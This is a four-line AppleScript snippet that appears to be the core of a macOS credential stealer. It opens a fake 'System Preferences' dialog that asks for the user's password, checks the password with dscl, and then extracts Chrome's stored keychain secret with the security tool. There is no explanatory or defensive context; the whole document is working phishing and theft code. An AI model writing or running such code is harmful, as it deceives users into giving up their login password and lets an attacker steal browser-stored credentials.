set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set secret to text returned of reply
do shell script "dscl . authonly user " & quoted form of secret
do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
